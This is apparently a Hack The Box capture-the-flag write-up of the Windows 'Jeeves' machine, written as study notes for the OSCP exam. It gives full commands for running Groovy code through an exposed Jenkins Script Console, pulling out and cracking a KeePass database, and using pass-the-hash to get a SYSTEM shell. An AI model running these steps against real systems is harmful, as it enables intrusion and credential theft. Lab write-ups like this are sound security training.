# Jeeves (HTB)

> Platform: Hack The Box  
> OS: Windows  
> Difficulty: Medium  
> Result: Administrator

---

## Attack Chain

```text
Reconnaissance
  |-- nmap -p- -> 80 (IIS 10.0 Ask Jeeves), 135, 445, 50000 (Jetty 9.4.z)
  |-- Directory brute-force on 50000 -> /askjeeves (Jenkins 2.87)
Foothold
  |-- Anonymous Script Console at /askjeeves/script
  |-- Groovy execution -> command execution as jeeves\kohsuke
  |-- Read user flag from C:\Users\kohsuke\Desktop\user.txt
Privilege Escalation
  |-- KeePass database CEH.kdbx in C:\Users\kohsuke\Documents
  |-- keepass2john + john -> master password <KEEPASS_PASSWORD>
  |-- Administrator NT hash recovered from KeePass entry
  |-- impacket-smbexec with -hashes -> SYSTEM shell
  |-- dir /R -> hm.txt:root.txt:$DATA (alternate data stream)
  |-- Read root flag from the ADS
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Jeeves is a Windows host that exposes IIS on port 80, SMB on 445 and a Jetty instance on a high-numbered port. The Jetty server hosts a Jenkins deployment hidden behind a non-standard context path. Jenkins allows anonymous access to its Groovy Script Console, which gives direct command execution as the service account. From that user context, a KeePass database in the profile yields the local Administrator NT hash, which is reused via pass-the-hash. The final root flag is stored in an alternate data stream attached to a harmless-looking text file on the Administrator desktop.

## Reconnaissance

Full TCP scan and service detection:

```bash
$ nmap -p- --min-rate 5000 -Pn 10.129.228.112
...
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
```

Port 80 returns a small static page titled "Ask Jeeves". Port 50000 is a Jetty container that returns 404 for the root path. Neither the directory listing nor the HTTP headers reveal the Jenkins context path directly, so fuzz both surfaces with a small wordlist:

```bash
$ gobuster dir -q -u http://10.129.228.112:50000/ -w /usr/share/wordlists/dirb/common.txt -t 30
...
/askjeeves  (Status: 302)
```

Following the redirect lands on the Jenkins dashboard at /askjeeves/. The page footer reports "Jenkins ver. 2.87". The top-right corner shows "log in", which means the anonymous account is being used. Visiting /askjeeves/script returns HTTP 200 and renders the Groovy Script Console without authentication.

## Foothold

No CVE (custom vulnerability) - the Jenkins Groovy Script Console is exposed without authentication; anonymous access to the administrative interface allows arbitrary Groovy code execution as the Jenkins service account.

The Script Console accepts a POST body of the form script=<groovy code>. Jenkins enforces a CSRF crumb, so first obtain a session cookie and a crumb:

```bash
$ cookie=$(mktemp)
$ crumb=$(curl -s -c $cookie -b $cookie -A 'Mozilla/5.0' \
    http://10.129.228.112:50000/askjeeves/script \
    | grep -oP 'Jenkins-Crumb", "\K[^"]+')
$ echo $crumb
<JENKINS_CRUMB>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Confirm code execution with a benign command:

```bash
$ curl -s -b $cookie -A 'Mozilla/5.0' -H "Jenkins-Crumb: $crumb" \
    --data-urlencode 'script=println "whoami".execute().text' \
    http://10.129.228.112:50000/askjeeves/script \
    | sed -n '/<h2>Result<\/h2><pre>/,/<\/pre>/p' | sed '1s/.*<pre>//; $s/<\/pre>.*//'
jeeves\kohsuke
```

The service account is jeeves\kohsuke. List the profile and read the user flag through the same Groovy sink:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Desktop/user.txt").text' ...
<USER_FLAG>
```

The Documents folder contains a KeePass database that will be used for privilege escalation:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Documents").list().join("\n")' ...
AppData
Desktop
Documents
...
```

## Privilege Escalation

Transfer C:/Users/kohsuke/Documents/CEH.kdbx to the attacker host. The easiest path is to base64-encode the file through the Script Console and paste it locally:

```bash
$ curl ... --data-urlencode 'script=println new File("C:/Users/kohsuke/Documents/CEH.kdbx").bytes.encodeBase64().toString()' ... > kdbx.b64
$ base64 -d kdbx.b64 > CEH.kdbx
$ file CEH.kdbx
CEH.kdbx: Keepass password database 2.x KDBX
```

Extract the hash and crack the master password with John:

```bash
$ keepass2john CEH.kdbx > ceh.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt ceh.hash
...
<KEEPASS_PASSWORD>       (CEH)
$ john --show ceh.hash
CEH:<KEEPASS_PASSWORD>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Open the database with keepassxc-cli. The entry "Backup stuff" holds the NT hash of the local Administrator:

```bash
$ keepassxc-cli show -s -a Password CEH.kdbx "Backup stuff"
<ADMIN_NT_HASH>
```

Reuse the hash with pass-the-hash. wmiexec hangs on this host, but smbexec works because it only needs cmd.exe on the target:

```bash
$ impacket-smbexec -hashes '<ADMIN_NT_HASH>' \
    -dc-ip 10.129.228.112 'jeeves/Administrator@10.129.228.112'
C:\Windows\system32>
```

Enumerate alternate data streams on the Administrator desktop:

```text
C:\Windows\system32> cmd.exe /c dir /R C:\Users\Administrator\Desktop
...
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
...
```

Read the hidden stream:

```text
C:\Windows\system32> cmd.exe /c powershell -c "Get-Content -Path C:\Users\Administrator\Desktop\hm.txt -Stream root.txt"
<ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

## Flags

| Flag | Value |
|------|-------|
| User | `<USER_FLAG>` |
| Root | `<ROOT_FLAG>` |

## Key Takeaways

- Jenkins Script Console is a high-impact finding. If reachable anonymously, it is a direct RCE primitive regardless of the Jenkins version.
- wmiexec relies on Win32_Process.Create and often hangs behind Defender or a slow WMI provider; smbexec is a lighter alternative that only needs SMB and cmd.exe.
- Pass-the-hash works against local Administrator accounts even when the plaintext password is unknown, as long as the NTLM hash is recovered.
- Alternate data streams are invisible to `dir` and `Get-Content` by default. `dir /R` and `Get-Content -Stream <name>` are the canonical way to enumerate and read them.
- KeePass databases in user profiles are common in CTFs and in real incident response engagements; always check for `.kdbx` files during post-exploitation.
